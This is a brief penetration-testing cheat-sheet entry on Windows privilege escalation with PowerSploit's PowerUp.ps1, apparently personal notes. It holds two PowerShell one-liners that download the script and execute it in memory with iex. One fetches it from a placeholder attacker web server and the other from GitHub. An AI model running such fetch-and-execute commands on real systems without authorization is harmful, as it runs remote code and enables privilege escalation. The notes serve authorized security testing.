# Privilege Escalation

## PowerUp.ps1

Link https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

Download and run from attacker's machine

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/PowerUp.ps1');Invoke-AllChecks
```

Download and run from internet

```
powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks
```


